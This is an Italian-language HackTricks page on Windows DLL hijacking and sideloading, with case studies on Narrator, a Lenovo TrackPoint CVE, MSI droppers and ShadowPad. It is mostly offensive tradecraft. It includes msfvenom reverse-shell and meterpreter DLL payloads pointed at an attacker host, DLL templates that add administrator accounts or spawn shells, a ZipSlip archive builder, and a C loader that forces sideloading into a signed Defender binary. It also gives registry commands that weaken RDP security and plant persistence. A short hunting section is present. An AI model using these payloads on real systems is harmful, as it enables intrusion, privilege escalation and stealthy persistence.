# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking coinvolge la manipolazione di un'applicazione fidata per farle caricare una DLL malevola. Questo termine comprende diverse tecniche come **DLL Spoofing, Injection, and Side-Loading**. È usato principalmente per code execution, ottenere persistence e, meno comunemente, privilege escalation. Nonostante qui il focus sia sull'escalation, il metodo di hijacking rimane coerente tra gli obiettivi.

### Common Techniques

Diversi metodi vengono impiegati per il DLL hijacking, ognuno con efficacia diversa a seconda della strategia di caricamento delle DLL da parte dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL legittima con una malevola, opzionalmente usando DLL Proxying per preservare la funzionalità originale della DLL.
2. **DLL Search Order Hijacking**: Inserire la DLL malevola in un percorso di ricerca prima di quella legittima, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che l'applicazione carichi, credendo che sia una DLL richiesta ma inesistente.
4. **DLL Redirection**: Modificare parametri di ricerca come `%PATH%` o file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Inserire la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, in modo simile alle tecniche di Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Il classico DLL sideloading non è l'unico modo per far caricare codice dell'attaccante a un processo fidato **.NET Framework**. Se l'eseguibile target è un'applicazione **managed**, il CLR consulta anche un **application configuration file** con il nome dell'eseguibile (ad esempio `Setup.exe.config`). Quel file può definire un **AppDomainManager** personalizzato. Se il config punta a un assembly controllato dall'attaccante posizionato accanto all'EXE, il CLR lo carica **prima del normale code path dell'applicazione** ed esegue il codice all'interno del processo fidato.

Secondo lo schema di configurazione di .NET Framework di Microsoft, sia `<appDomainManagerAssembly>` sia `<appDomainManagerType>` devono essere presenti perché il manager personalizzato venga usato.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Note pratiche:
- Questo è tradecraft specifico di **.NET Framework**. Dipende dal parsing della configurazione del CLR, non dal Win32 DLL search order.
- L'host deve essere davvero un **managed EXE**. Triage rapido: `sigcheck -m target.exe`, `corflags target.exe`, oppure controlla il **CLR Runtime Header** nei metadati PE.
- Il nome del file di configurazione deve corrispondere esattamente al nome dell'eseguibile (`<binary>.config`) e di solito si trova **accanto all'EXE**.
- Questo è utile con **signed Microsoft/vendor binaries** perché l'EXE trusted resta intatto mentre l'assembly managed malevolo viene eseguito in-process.
- Se hai già una directory di installazione/update scrivibile, l'AppDomainManager hijacking può essere usato come **first stage**, seguito da classic DLL sideloading o reflective loading per le fasi successive.

### Hijacking di un scheduled task esistente per rilanciare la sideload chain

Per la persistenza, non cercare solo la **creazione di un nuovo task**. Alcuni intrusion set aspettano che un installer legittimo crei un **normal updater task** e poi **riscrivono l'azione del task** così che il nome, l'autore e il trigger esistenti restino familiari ai defender.

Workflow riutilizzabile:
1. Installa/esegui il software legittimo e identifica il task che crea normalmente.
2. Esporta l'XML del task e annota i valori attuali di `<Exec><Command>` / `<Arguments>`.
3. Sostituisci solo l'azione in modo che il task avvii il tuo **trusted host EXE** da una directory di staging scrivibile dall'utente, che poi side-loads o AppDomain-loads il payload reale.
4. Registra di nuovo lo stesso nome del task invece di creare un nuovo artefatto di persistenza ovvio.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Perché è più stealth:
- Il nome della task può comunque sembrare legittimo (per esempio un updater del vendor).
- Il **Task Scheduler service** la avvia, quindi la validazione di parent/ancestor spesso vede la catena di scheduling attesa invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi nomi di task** possono perdere una task la cui registrazione esisteva già ma la cui action ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o ad un altro percorso controllato dall'attaccante.

Punti rapidi di hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confronta i metadati XML di `C:\Windows\System32\Tasks\*` e `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Allerta quando una **vendor-looking updater task** esegue da **user-writable directories** o avvia una .NET EXE con un file `*.config` presente nella stessa cartella.

> [!TIP]
> Per una chain passo-passo che combina HTML staging, configurazioni AES-CTR e implant .NET sopra DLL sideloading, esamina il workflow qui sotto.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Il modo più comune per trovare Dlls mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

e mostrare solo la **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Se stai cercando **missing dlls in generale** lascia questa operazione in esecuzione per alcuni **secondi**.\
Se stai cercando una **missing dll dentro un eseguibile specifico** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo e fermare la cattura degli eventi**.

## Exploiting Missing Dlls

Per fare privilege escalation, la migliore possibilità che abbiamo è poter **scrivere una dll che un processo privilegiato cercherà di caricare** in qualche **posizione in cui verrà cercata**. Quindi, potremo **scrivere** una dll in una **cartella** in cui la **dll viene cercata prima** della cartella dove si trova la **dll originale** (caso strano), oppure potremo **scrivere in una cartella dove la dll verrà cercata** e la dll originale **non esiste** in nessuna cartella.

### Dll Search Order

**Dentro la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come vengono caricate specificamente le Dlls.**

Le **Windows applications** cercano le DLL seguendo un insieme di **pre-defined search paths**, rispettando una sequenza precisa. Il problema della DLL hijacking nasce quando una DLL malevola viene posizionata strategicamente in una di queste directory, garantendo che venga caricata prima della DLL autentica. Una soluzione per prevenire ciò è fare in modo che l'applicazione usi percorsi assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere il **DLL search order su sistemi 32-bit** qui sotto:

1. La directory da cui è stata caricata l'applicazione.
2. La system directory. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il path di questa directory.(_C:\Windows\System32_)
3. La 16-bit system directory. Non esiste una funzione che ottiene il path di questa directory, ma viene cercata. (_C:\Windows\System_)
4. La Windows directory. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il path di questa directory.
1. (_C:\Windows_)
5. La current directory.
6. Le directory elencate nella variabile d'ambiente PATH. Nota che questo non include il per-application path specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene usata quando si calcola il DLL search path.

Questo è il **default** search order con **SafeDllSearchMode** abilitato. Quando è disabilitato, la current directory sale al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (default: abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll può essere caricata indicando il percorso assoluto invece del solo nome**. In quel caso quella dll verrà **cercata solo in quel path** (se la dll ha dipendenze, queste verranno cercate come se fossero state caricate solo per nome).

Esistono altri modi per alterare l'ordine di ricerca, ma non li spiegherò qui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Usa i filtri di **ProcMon** (`Process Name` = target EXE, `Path` termina con `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo prova a caricare ma non trova.
2. Se il binary gira su una **schedule/service**, depositare una DLL con uno di quei nomi nella **application directory** (voce #1 dell'ordine di ricerca) farà sì che venga caricata alla prossima esecuzione. In un caso di scanner .NET il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Costruisci una payload DLL (ad es. reverse shell) con qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se il tuo primitive è una **ZipSlip-style arbitrary write**, crea uno ZIP la cui entry esca dalla extraction dir così la DLL finisca nella cartella dell'app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Recapitare l'archivio nella inbox/share monitorata; quando lo scheduled task riavvia il processo, questo carica la DLL malevola ed esegue il tuo codice come service account.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le ntdll native APIs. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata per nome (nessun absolute path e senza usare i safe loading flags) può essere forzato a caricare una DLL malevola da quella directory.

Key idea
- Costruisci i process parameters con RtlCreateProcessParametersEx e fornisci un DllPath personalizzato che punti alla tua cartella controllata (ad es. la directory dove si trova il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binary target risolve una DLL per nome, il loader consulterà questo DllPath fornito durante la risoluzione, consentendo un sideloading affidabile anche quando la DLL malevola non è nella stessa directory dell'EXE target.

Notes/limitations
- Questo influisce sul child process che viene creato; è diverso da SetDllDirectory, che influenza solo il current process.
- Il target deve importare o LoadLibrary una DLL per nome (nessun absolute path e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e gli absolute paths hardcoded non possono essere hijacked. Gli forwarded exports e SxS possono cambiare la precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Metti una xmllite.dll malevola (che esporti le funzioni richieste o faccia proxy verso quella reale) nella tua directory DllPath.
- Avvia un binary firmato noto per cercare xmllite.dll per nome usando la tecnica sopra. Il loader risolve l'import tramite il DllPath fornito e fa sideload della tua DLL.

Questa tecnica è stata osservata in-the-wild per guidare catene di sideloading multi-stage: un launcher iniziale rilascia una DLL helper, che poi avvia un binary firmato da Microsoft, hijackable, con un DllPath personalizzato per forzare il caricamento della DLL dell'attacker da una directory di staging.


#### Exceptions on dll search order from Windows docs

Alcune eccezioni all'ordine standard di ricerca delle DLL sono indicate nella documentazione di Windows:

- Quando viene incontrata una **DLL che condivide il nome con un'altra già caricata in memoria**, il sistema bypassa la ricerca abituale. Invece, esegue un controllo per redirection e un manifest prima di fare fallback alla DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca della DLL**.
- Nei casi in cui la DLL venga riconosciuta come una **known DLL** per la versione corrente di Windows, il sistema utilizzerà la sua versione della known DLL, insieme a eventuali DLL dipendenti, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste known DLL.
- Se una **DLL ha dipendenze**, la ricerca di queste DLL dipendenti viene eseguita come se fossero indicate solo dai loro **module names**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un full path.

### Escalating Privileges

**Requirements**:

- Identifica un processo che opera o opererà con **different privileges** (horizontal o lateral movement), al quale **manca una DLL**.
- Assicurati che sia disponibile **write access** per qualsiasi **directory** in cui la **DLL** verrà **cercata**. Questa posizione può essere la directory dell'eseguibile oppure una directory all'interno del system path.

Sì, i requisiti sono complicati da trovare perché **by default è abbastanza strano trovare un eseguibile privilegiato che non abbia una dll** ed è ancora **più strano avere permessi di scrittura su una cartella del system path** (di default non puoi). Ma, in ambienti misconfigurati, questo è possibile.\
Se sei fortunato e ti ritrovi a soddisfare i requisiti, puoi controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se il **main goal del progetto è bypass UAC**, lì potresti trovare un **PoC** di un Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando solo il path della cartella in cui hai i permessi di scrittura).

Nota che puoi **check your permissions in a folder** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifica i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare le imports di un executable e le exports di un dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking to escalate privileges** con permessi di scrittura in una cartella **System Path** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se hai permessi di scrittura su qualche cartella all'interno del system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Example

Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare una dll che esporti almeno tutte le funzioni che l'executable importerà da essa**. In ogni caso, nota che Dll Hijacking è utile per [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio su dll hijacking focalizzato sul dll hijacking per execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **next sectio**n puoi trovare alcuni **basic dll codes** che potrebbero essere utili come **templates** o per creare una **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll capace di **execute your malicious code when loaded** ma anche di **expose** e **work** come **exected** tramite il **relay di tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un executable e selezionare la library** che vuoi proxify e **generate a proxified dll** oppure **indicare la Dll** e **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86, non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Proprio

Nota che in diversi casi il Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima, se queste funzioni non esistono il **binary non sarà in grado di caricarle** e l'**exploit fallirà**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL in C++ con creazione dell’utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a verificare all'avvio una DLL di localizzazione prevedibile e specifica per lingua, che può essere hijacked per arbitrary code execution e persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silence OPSEC
- Un hijack ingenuo parlerà/metterà in evidenza la UI. Per restare silenziosi, all'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e fai `SuspendThread` su di esso; continua nel tuo thread. Vedi il PoC per il codice completo.

Trigger e persistence tramite configurazione Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviare Narrator carica la DLL piazzata. Sulla secure desktop (schermata di logon), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sulla secure desktop.

Esecuzione SYSTEM attivata via RDP (lateral movement)
- Consenti il classico livello di sicurezza RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Collegati via RDP all'host, alla schermata di logon premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sulla secure desktop.
- L'esecuzione si interrompe quando la sessione RDP si chiude—inject/migra rapidamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce del registro di uno strumento Accessibility integrato (AT) (ad es. CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla, poi impostare `configuration` su quel nome AT. Questo fa da proxy all'esecuzione arbitraria nel framework Accessibility.

Notes
- Scrivere in `%windir%\System32` e modificare i valori HKLM richiede privilegi admin.
- Tutta la logica del payload può vivere in `DLL_PROCESS_ATTACH`; non servono export.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** in Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguito ogni giorno alle 9:30 AM nel contesto dell'utente loggato.
- **Directory Permissions**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di depositare file arbitrari.
- **DLL Search Behavior**: prova a caricare `hostfxr.dll` dalla sua directory di lavoro per prima e registra "NAME NOT FOUND" se manca, indicando la precedenza della ricerca nella directory locale.

### Exploit Implementation

Un attacker può piazzare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere code execution nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Come utente standard, drop `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che la scheduled task venga eseguita alle 9:30 AM nel contesto dell'utente corrente.
3. Se un amministratore è loggato quando la task viene eseguita, la DLL malevola viene eseguita nella sessione dell'amministratore con medium integrity.
4. Catena standard di tecniche UAC bypass per elevare da medium integrity ai privilegi SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli threat actors spesso combinano droppers basati su MSI con DLL side-loading per eseguire payload sotto un processo trusted e signed.

Panoramica della catena
- L'utente scarica l'MSI. Una CustomAction viene eseguita in silenzio durante l'installazione GUI (ad es. LaunchApplication o una VBScript action), ricostruendo il next stage da risorse embedded.
- Il dropper scrive una EXE legittima, signed, e una DLL malevola nella stessa directory (esempio: wsc_proxy.exe signed da Avast + wsc.dll controllata dall'attacker).
- Quando la EXE signed viene avviata, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla working directory, eseguendo il codice dell'attacker sotto un parent signed (ATT&CK T1574.001).

Analisi MSI (cosa cercare)
- Tabella CustomAction:
- Cerca entry che eseguono executables o VBScript. Pattern sospetto di esempio: LaunchApplication che esegue un file embedded in background.
- In Orca (Microsoft Orca.exe), ispeziona le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload embedded/split nel CAB dell'MSI:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usa lessmsi: lessmsi x package.msi C:\out
- Cerca più frammenti piccoli che vengono concatenati e decrypted da una VBScript CustomAction. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Drop these two files in the same folder:
- wsc_proxy.exe: host firmato legittimo (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: DLL dell'attaccante. Se non sono richiesti export specifici, DllMain può essere sufficiente; altrimenti, crea una proxy DLL e inoltra gli export richiesti alla libreria genuina mentre esegui il payload in DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un proxying framework (ad esempio DLLirant/Spartacus) per generare una forwarding DLL che esegua anche il tuo payload.

- Questa tecnica si basa sulla resolution del nome DLL da parte del binary host. Se l’host usa path assoluti o safe loading flags (ad esempio LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l’hijack può fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedence e devono essere considerati durante la selezione del binary host e dell’export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per mimetizzarsi come software legittimo mantenendo il core payload cifrato su disco:

1. **Signed host EXE** – vengono abusati vendor come AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attacker rinominano l’eseguibile per farlo sembrare un binary di Windows (per esempio `conhost.exe`), ma la signature Authenticode resta valida.
2. **Malicious loader DLL** – rilasciata accanto all’EXE con un nome atteso (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è di solito un binary MFC offuscato con il framework ScatterBrain; il suo unico compito è individuare il blob cifrato, decifrarlo e mappare riflessivamente ShadowPad.
3. **Encrypted payload blob** – spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo il memory-mapping del payload decifrato, il loader elimina il file TMP per distruggere le prove forensi.

Tradecraft notes:

* Rinominare il signed EXE (mantenendo però l’`OriginalFileName` originale nell’header PE) gli permette di impersonare un binary di Windows pur conservando la vendor signature, quindi replica l’abitudine di Ink Dragon di rilasciare binary dall’aspetto di `conhost.exe` che in realtà sono utility AMD/NVIDIA.
